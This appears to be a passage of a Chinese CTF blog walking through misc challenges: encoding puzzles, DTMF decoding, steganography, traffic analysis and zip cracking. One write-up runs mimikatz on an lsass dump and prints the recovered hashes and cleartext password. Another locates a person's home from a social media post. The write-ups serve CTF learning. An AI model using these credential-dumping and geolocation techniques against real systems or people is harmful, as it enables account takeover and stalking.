class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到给出的有效的条件的内容仅为一堆十六进制的字符串，这个时候考虑下面的编码方式。</p><p>两位十六进制转十进制<code>-128</code>再转ASCII。脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd '</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x '</span> <span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">128</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="手机按键音"><a href="#手机按键音" class="headerlink" title="手机按键音"></a>手机按键音</h3><h4 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h4><p><a href="http://dialabc.com/sound/detect/index.html">在线网站</a></p><p>DTMF拨号音识别</p><pre class="line-numbers language-none"><code class="language-none">999 * 666 * 88 * 2 * 777 * 33 * 6 * 99 * 4 * 444 * 777 * 555 * 333 * 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按九宫格解一下码为</p><pre class="line-numbers language-none"><code class="language-none">you are my girlfriend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线网站识别的总是少一段，虽然最后我们推测也是可以推测出来的，但是还是有拨号音识别的相关的专用的工具以供下载的</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">拨号音识别工具</a></p><p><a href="http://freshmeat.sourceforge.net/projects/dtmf2num">dtmf2num官方网址</a></p><p><img src="/2021/05/28/CTF/image-20210701205601479.png" alt="image-20210701205601479"></p><pre class="line-numbers language-none"><code class="language-none">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777youaremygirlfriends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>flag&#123;youaremygirlfriends&#125;</code></p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="地图分析——BugKu社工-进阶收集"><a href="#地图分析——BugKu社工-进阶收集" class="headerlink" title="地图分析——BugKu社工-进阶收集"></a>地图分析——BugKu社工-进阶收集</h3><p>提　　示: flag{小美小区名字拼音}</p><p>描　　述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)</p><p>给出的附件内容如下所示</p><p><img src="/2021/05/28/CTF/qq.png" alt="附件"></p><p>首先看到那个塔是大雁塔，根据发帖的内容确定</p><ol><li>从发帖人家(附近的<strong>始发站</strong>)出发到大雁塔要做7站地铁。</li><li>该始发站距发帖人家的小区有800米</li><li>下一站距发帖人家1000多米。</li></ol><p>找到大雁塔附近的地铁路线图如下：</p><p><img src="/2021/05/28/CTF/20210219162217227.png" alt="西安地铁路线图"></p><p><img src="/2021/05/28/CTF/image-20210528200737880.png" alt="确定始发站为韦曲南站"></p><p>根据地铁线路图可以发现只有韦曲南站距离大雁塔的站点数为7并且中间又转乘(在小寨)了一站，故现在的条件为，发帖人家的小区距离韦曲南站有800米、距航天城1000多米。打开百度地图</p><p><img src="/2021/05/28/CTF/image-20210528201622601.png" alt="image-20210528201622601"></p><p>到目前为止，差不多一眼就能看出来了，很明显发帖人所在的小区就是兰乔国际城</p><p><img src="/2021/05/28/CTF/image-20210528201736743.png" alt="对距离的大概估算"></p><p><code>flag&#123;lanqiaoguojicheng&#125;</code></p><h2 id="二维码与拼图"><a href="#二维码与拼图" class="headerlink" title="二维码与拼图"></a>二维码与拼图</h2><h3 id="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"><a href="#根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事" class="headerlink" title="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"></a>根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</h3><p>附件内容为</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">0000000001110010000000000000000000001111010000000000000000011100010000000000000000010111100000000000000000001010101000000000000000000011000101000000000000000010101010100000000000000000100000110000000011000111011101101000110000001000010110010010010100010011110100001110111001100111101001010110010010011000001001100001001101000111100011111101110010100010110111110011011111101111000110110010010101101100100011110011111111111011100000000101100011000101000000000010010100101010001000000001010101010001100100000000001001111111100100000000000011001011110111000000000100110010010000100000000110000110110110010000000011010000101110101<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测可能是个二维码的形状，打开python写一手转换代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\r'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 这个我后来又改了一下，这个我感觉是复原二维码来说最好用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210529000305513.png" alt="得到下面的图像"></p><p>然后用ps添加一下二维码的三个角获得完整的二维码。</p><p>定位角如下</p><p><img src="/2021/05/28/CTF/image-20210528235634252.png" alt="定位角"></p><p>把定位角粘到二维码的三个角的地方就行了，或者使用windows 的画图程序也挺好使的其实，但是如果是拼图的话，画图可能就不是那么好使了。</p><p><img src="/2021/05/28/CTF/image-202105290003055132.png" alt="image-202105290003055132"></p><p>用手机qq勉强也是能扫出来flag的，就是我画的不太好看，用在线的网站都不行。。。<code>flag&#123;QR_c0de_1s_1nterest1n9&#125;</code></p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><h3 id="BugKu、easy-nbt"><a href="#BugKu、easy-nbt" class="headerlink" title="BugKu、easy_nbt"></a>BugKu、easy_nbt</h3><p>这个直接下载个文件的专用打开器，然后把New World文件夹拉入文件打开器search-&gt;value=flag。就找到flag了。</p><p><img src="/2021/05/28/CTF/image-20210530135639553.png" alt="image-20210530135639553"></p><p><code>flag&#123;Do_u_kN0w_nbt?&#125;</code></p><h3 id="buu、-WUSTCTF2020-爬"><a href="#buu、-WUSTCTF2020-爬" class="headerlink" title="buu、[WUSTCTF2020]爬"></a>buu、[WUSTCTF2020]爬</h3><p><strong>TAG:pdf隐写、未解决</strong></p><p>使用一般的txt浏览器看一眼是pdf的文件格式，直接把后缀名改为pdf，要修改pdf，暂时未解决。</p><h2 id="文件内容隐藏"><a href="#文件内容隐藏" class="headerlink" title="文件内容隐藏"></a>文件内容隐藏</h2><p>这个一般是图片内部加入一些东西，ctf常见题型之一，其类型可能应归属于图片隐写。</p><h3 id="尾部藏文本"><a href="#尾部藏文本" class="headerlink" title="尾部藏文本"></a>尾部藏文本</h3><h4 id="unicode编码-BugKu、这是一张单纯的图片"><a href="#unicode编码-BugKu、这是一张单纯的图片" class="headerlink" title="unicode编码-BugKu、这是一张单纯的图片"></a>unicode编码-BugKu、这是一张单纯的图片</h4><p>是最简单的隐写题类型，直接在文件的尾部发现下面的内容</p><pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个内容一看就是unicode啊，再看都小于0xff，那就可以转ASCII码了，直接上拿手python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;'</span>res1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';&amp;#'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># key&#123;you are right&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Unicode特征<code>&amp;#&#123;&#125;;</code>，大括号内的内容是数字。</p><h3 id="尾部藏文件"><a href="#尾部藏文件" class="headerlink" title="尾部藏文件"></a>尾部藏文件</h3><h4 id="outguess隐写、alison-likes-jojo"><a href="#outguess隐写、alison-likes-jojo" class="headerlink" title="outguess隐写、alison_likes_jojo"></a>outguess隐写、alison_likes_jojo</h4><p>没啥好说的，压缩包解压之后是两张图片，图片尾部发现zip文件的文件头<code>pk</code>，直接在winhex里面复制粘贴为zip文件后是个真加密的zip，爆破得口令为<code>888866</code>，解压这个压缩包得到内容</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>三次解base64之后得到后面的jpg文件的outguess隐写的key为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">killerqueen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要再对后面的jpg进行outguess，命令为</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">outguess -k &#39;killerqueen&#39; -r &#39;jljy.jpg&#39; flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601141030631.png" alt="image-20210601141030631"></p><p>得到flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="PNG图片隐写"><a href="#PNG图片隐写" class="headerlink" title="PNG图片隐写"></a>PNG图片隐写</h2><h3 id="修改PNG图片的宽高隐写"><a href="#修改PNG图片的宽高隐写" class="headerlink" title="修改PNG图片的宽高隐写"></a>修改PNG图片的宽高隐写</h3><h4 id="BugKu、隐写"><a href="#BugKu、隐写" class="headerlink" title="BugKu、隐写"></a>BugKu、隐写</h4><p>开局给了一张png图片，拖入winhex改宽高即可。</p><p>先查看文件的详细信息，找到图片的分辨率为<code>500 x 420</code>转成十六进制也就是<code>01F4 x 01A4</code>，在winhex中找到高度宽度位，修改高度位<code>01A4</code>为<code>02A4</code></p><p><img src="/2021/05/28/CTF/image-20210530143746251.png" alt="image-20210530143746251"></p><p><code>BUGKU&#123;a1e5aSA&#125;</code></p><h3 id="PNGのLSB最低位"><a href="#PNGのLSB最低位" class="headerlink" title="PNGのLSB最低位"></a>PNGのLSB最低位</h3><p>一般使用zsteg &amp;&amp; stegsolve &amp;&amp; python脚本解</p><pre class="line-numbers language-none"><code class="language-none"># zsteg使用方法zsteg test.png# 将内容分离到文件zsteg test.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h4><p><strong>TAG:zsteg使用、html、base64</strong></p><p>题目给的附件是两个文件，一个图片，一个有个html的src源代码文件，vscode打开html，发现</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2==="</span> <span class="token delimiter important">?></span></span>suctf&#123;hAHaha_Fak3_F1ag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就是那个图片了，png考虑lsb，使用zsteg工具，</p><pre class="line-numbers language-none"><code class="language-none">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.pngimagedata           .. text: &quot;*,+555\n\n\n&quot;b1,r,lsb,xy         .. text: &quot;4QPz1&#123;wS?[P&quot;b1,rgb,lsb,xy       .. file: openssl enc&#39;d data with salted password, base64 encodedb2,r,lsb,xy         .. file: 0420 Alliant virtual executable common library not strippedb3,r,lsb,xy         .. file: StarOffice Gallery theme \375\245N\333PNO\376\3017\026\003\360D\0055%\226Y$\237\3738\020\331\247\226\377-\226\331\177\004\020\233, 50397955 objects, 1st \001b3,b,lsb,xy         .. text: &quot;Yx(7TRIc&quot;b4,r,lsb,xy         .. text: &quot;gwfE#UU #Dwvh&quot;b4,r,msb,xy         .. text: [&quot;\&quot;&quot; repeated 8 times]b4,g,lsb,xy         .. text: &quot;vwvETgfRDw&quot;b4,g,msb,xy         .. text: &quot;!!ffffffff&quot;b4,b,lsb,xy         .. text: &quot;#EDEUEUEEx&quot;b4,b,msb,xy         .. text: &quot;!!ffffffff&quot;b4,rgb,lsb,xy       .. text: &quot;i%p$$sFG&quot;b4,bgr,lsb,xy       .. text: &quot;Yeu$ t&amp;C&quot;┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>出来的<code>1.txt</code>文件的头部发现分组加密的内容</p><p><img src="/2021/05/28/CTF/image-20210606153006340.png" alt></p><pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以前面解得的fake flag作为密钥，解3DES可得flag</p><pre class="line-numbers language-none"><code class="language-none">suctf&#123;U_F0und_1t&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606153135261.png" alt></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="Telnet流量分析"><a href="#Telnet流量分析" class="headerlink" title="Telnet流量分析"></a>Telnet流量分析</h3><h4 id="Bugku、telnet"><a href="#Bugku、telnet" class="headerlink" title="Bugku、telnet"></a>Bugku、telnet</h4><p>给的流量包拖入wireshark打开跟踪流直接跟踪一段TCP流发现flag</p><p><img src="/2021/05/28/CTF/image-20210530145908225.png" alt="image-20210530145908225"></p><p><code>flag&#123;d316759c281bf925d600be698a4973d5&#125;</code></p><h3 id="http流量分析"><a href="#http流量分析" class="headerlink" title="http流量分析"></a>http流量分析</h3><h4 id="buu、百里挑一"><a href="#buu、百里挑一" class="headerlink" title="buu、百里挑一"></a>buu、百里挑一</h4><p>首先打开wireshark查看一下有什么数据都</p><p><img src="/2021/05/28/CTF/image-20210601230943606.png" alt="image-20210601230943606"></p><p>一看流量包瞬间明白出题人什么意思了，这是让从100多张图片里面选出来包含信息的那个啊，直接导出http对象。。。没啥用</p><p>用<code>exiftool *</code>，发现半拉flag。</p><p><img src="/2021/05/28/CTF/image-20210601232818680.png" alt="image-20210601232818680"></p><p><code>恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</code>，另一半在wireshark里面<code>TCP流 114</code>，这里可以一个一个看，应该没啥简单的方法了。</p><p><img src="/2021/05/28/CTF/image-20210601233334032.png" alt="image-20210601233334032"></p><p><code>26a3c0589d23edeec&#125;</code></p><p><code>flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</code></p><h4 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h4><p>wireshark打开文件，稍微一追踪tcp流就知道这是某嗨客拿工具在扫目录，直接向后跳，到大约<code>819条数据</code>开始出现有用的数据，第824条数据出现关键字<code>flag.txt</code>，还有pk，应该是flag在压缩包里面，压缩包被嗨客下载下来了，导出所有http对象。但是里面并没有发现zip文件，只好使用foremost再分离一下。</p><p><img src="/2021/05/28/CTF/image-20210606114640134.png" alt></p><p>想起刚才导出http对象时有一个lsass文件，最近学域渗透恰巧知道了这个是windows里面存放开机口令的文件，可使用mimikatz来解析。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得</p><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 347784 (00000000:00054e88)Session           : Interactive from 1User Name         : AdministratorDomain            : WIN7Logon Server      : WIN7Logon Time        : 2019&#x2F;11&#x2F;14 9:38:33SID               : S-1-5-21-1539156736-1959120456-2224594862-500        msv :         [00000003] Primary         * Username : Administrator         * Domain   : WIN7         * LM       : c4d0515fb12046a475113b7737dc0019         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f        tspkg :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        wdigest :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        kerberos :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        ssp :        credman :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-19        msv :        tspkg :        wdigest :         * Username : (null)         * Domain   : (null)         * Password : (null)        kerberos :         * Username : (null)         * Domain   : (null)         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-20        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 48847 (00000000:0000becf)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               :        msv :        tspkg :        wdigest :        kerberos :        ssp :        credman :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               : S-1-5-18        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :mimikatz #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解一下压缩包得flag(口令为<code>W3lc0meToD0g3</code>)</p><pre class="line-numbers language-none"><code class="language-none">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="office文件相关"><a href="#office文件相关" class="headerlink" title="office文件相关"></a>office文件相关</h2><h3 id="word文件内藏文件"><a href="#word文件内藏文件" class="headerlink" title="word文件内藏文件"></a>word文件内藏文件</h3><p>因为office文件的近似于压缩包的格式，使得我们可以将想隐藏的文件藏入解压缩后的各个目录或者文件内，但是一般这样生搬硬套地隐写会导致office文件打开时内容乱码，所以对于office文件，一般来说，有内容乱码的就是文件内藏入了一些文件或者文本。</p><h4 id="bugku、眼见非实"><a href="#bugku、眼见非实" class="headerlink" title="bugku、眼见非实"></a>bugku、眼见非实</h4><p>这个题打开之后出现乱码，直接改后缀名为zip，解压一下找到<code>word-&gt;document.xml</code>文件，打开搜索flag发现flag<code>flag&#123;F1@g&#125;</code></p><h2 id="压缩包密码"><a href="#压缩包密码" class="headerlink" title="压缩包密码"></a>压缩包密码</h2><h3 id="buu、-GUET-CTF2019-zips"><a href="#buu、-GUET-CTF2019-zips" class="headerlink" title="buu、[GUET-CTF2019]zips"></a>buu、[GUET-CTF2019]zips</h3><p><strong>TAG:伪加密、掩码爆破</strong></p><p>真加密爆破得第一层得口令为<code>723456</code>，第二层是个简单的伪加密，解出来得<code>flag.zip</code>、<code>setup.sh</code></p><pre class="line-numbers language-none"><code class="language-none">print(__import__(&#39;time&#39;).time())  # setup.sh文件的主要python代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>意思就是取出当前的时间作为<code>flag.zip</code>压缩包的密码，这里先看一下这个密码的格式(执行一下上面的python2代码)</p><pre class="line-numbers language-none"><code class="language-none">1622897453.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太长了，爆破估计是不太可能的，但是注意到这里有上一次的修改日期，有可能进行掩码爆破</p><p><img src="/2021/05/28/CTF/image-20210605204224196.png" alt></p><p>就是对小数点之后的内容进行爆破，将<code>2019-5-17 16:40:15</code>转换为时间戳为<code>1558082415</code>，设置初始的掩码为<code>1558082415.??</code>，如果没找到，就一位一位地向前移动掩码，最后掩码为<code>155808????.??</code>是获得口令为<code>1558080832.15</code>，解压得flag：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、-MRCTF2020-千层套路"><a href="#buu、-MRCTF2020-千层套路" class="headerlink" title="buu、[MRCTF2020]千层套路"></a>buu、[MRCTF2020]千层套路</h3><p><strong>TAG：zip多层加密、二维码像素、python脚本解</strong></p><p>给的时zip文件，套了很多层，每一层的密码就是这一层的压缩文件的文件名(不带上后缀名的文件名)，一层层解用脚本即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> osname <span class="token operator">=</span> <span class="token string">'0573'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ziip<span class="token punctuation">:</span>        ziip<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        delname <span class="token operator">=</span> name        name <span class="token operator">=</span> ziip<span class="token punctuation">.</span>filelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>delname <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得出文件<code>qr.zip</code>，解压出txt文件，用脚本再转成图片，200x200的图片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span 